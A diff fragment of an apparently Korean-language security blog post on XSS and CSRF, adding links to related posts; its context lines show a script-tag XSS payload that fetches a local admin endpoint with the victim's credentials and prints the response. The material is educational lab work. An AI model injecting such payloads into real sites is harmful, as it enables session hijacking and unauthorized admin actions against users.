@@ -237,3 +237,8 @@ xss?payload=
 <script>(async () => {const r = await fetch("127.0.0.1:5000/admin?path=login", { credentials: "include" });console.log("status:", r.status);console.log(await r.text());})();</script>
 
 ## 참고
+
+## 관련 문서
+
+- [\[SECURITY\] CSRF란?](../../../_posts/SECURITY/SECURITY_FUNDAMENTALS/2025-01-08-CSRF-Outline.md)
+- [\[SECURITY\] XSS란?](../../../_posts/SECURITY/SECURITY_FUNDAMENTALS/2024-12-11-XSS-Outline.md)
